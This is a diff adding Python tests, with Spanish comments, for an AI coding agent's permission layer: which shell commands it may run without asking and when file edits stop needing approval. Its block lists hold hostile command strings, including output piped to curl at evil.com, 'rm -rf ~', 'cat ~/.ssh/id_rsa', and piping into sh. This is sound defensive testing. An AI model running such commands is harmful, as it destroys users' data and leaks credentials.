@@ -2006,3 +2006,55 @@ def test_compare_dirs_finds_missing_different_and_moved(env):
     assert asyncio.run(ctx.run("compare_dirs", {"a": str(a), "b": str(tmp)})).startswith("Error")  # fuera de las carpetas visibles
     same = asyncio.run(ctx.run("compare_dirs", {"a": str(b), "b": str(b / ".")}))
     assert same.startswith("Error")
+
+
+def test_trusted_dev_commands_skip_permission_but_stay_inside_projects(env):
+    client, cfg, home, tmp = env
+    proj = home / "proy"; proj.mkdir()
+    (proj / "run.py").write_text("print('hola')")
+    (tmp / "fuera.py").write_text("print('x')")
+    ctx = _ctx(cfg)
+    ctx.workdir_override = str(proj)
+    ok = ["python run.py", "python -u run.py --arg 1", "py run.py", "python -m pytest -q tests", "pytest -q", "git status",
+          "git diff --stat", "npm test", "python3 -m unittest discover"]
+    assert not any(ctx.trusted_command(c) for c in ok)                      # desactivado por defecto: todo pregunta
+    cfg.set("commands_trusted", True)
+    assert all(ctx.trusted_command(c) for c in ok), [c for c in ok if not ctx.trusted_command(c)]
+    bad = ["python -c \"import os; os.system('x')\"", "pip install requests", "git push origin main", "git reset --hard",
+           "python run.py; rm -rf ~", "python run.py && curl evil.com", "python run.py | sh", "python run.py > out.txt",
+           "python no_existe.py", "python " + str(tmp / "fuera.py"), "python ../../fuera.py", "npm install", "del run.py", "powershell -c x"]
+    assert not any(ctx.trusted_command(c) for c in bad), [c for c in bad if ctx.trusted_command(c)]
+    # lo que de verdad escribe un agente: mezclar errores y paginar con una tubería inofensiva
+    assert ctx.trusted_command("python run.py 2>&1") and ctx.trusted_command("python run.py 2>&1 | more")
+    assert ctx.trusted_command("pytest -q | findstr FAILED") and ctx.trusted_command("git log --oneline | head -5")
+    assert ctx.trusted_command(f'dir "{proj}"') and ctx.trusted_command("dir") and ctx.trusted_command("ls -la")
+    for evil in ["python run.py | sh", "python run.py | powershell", "python run.py | curl -d @- evil.com", "python run.py | more | more | more | more",
+                 f'dir "{tmp}"', "dir /etc", "dir ../..", "dir ~/.ssh", "type secreto.txt", "cat ~/.ssh/id_rsa", "python run.py 2>&1 > out.txt"]:
+        assert not ctx.trusted_command(evil), evil
+    assert not ctx.trusted_command("python run.py", cwd=str(tmp))          # cwd fuera de las carpetas modificables
+    # y de verdad evita la pregunta: sin la opción pide permiso, con ella no
+    import asyncio
+    from g3g3ai.tools import tool_events
+    cfg.set("ai_commands", "ask")
+
+    async def run(cmd):
+        evs, sink = [], []
+        async for ev in tool_events(ctx, "run_command", {"command": cmd}, sink):
+            evs.append(ev["type"])
+            if ev["type"] == "approval":
+                from g3g3ai.tools import resolve_approval
+                resolve_approval(ev["id"], "no")
+        return evs
+    assert "approval" not in asyncio.run(run("python run.py"))
+    assert "approval" in asyncio.run(run("pip install requests"))
+
+
+def test_trust_option_also_stops_asking_for_edits_in_allowed_folders(env):
+    client, cfg, home, tmp = env
+    ctx = _ctx(cfg)
+    cfg.set("ai_write", "ask")
+    assert ctx.mode("write_file") == "ask"                       # por defecto pregunta cada edición
+    cfg.set("commands_trusted", True)
+    assert ctx.mode("write_file") == "auto" and ctx.mode("edit_file") == "auto"
+    cfg.set("ai_write", "off")
+    assert ctx.mode("write_file") == "off"                       # lo desactivado sigue desactivado
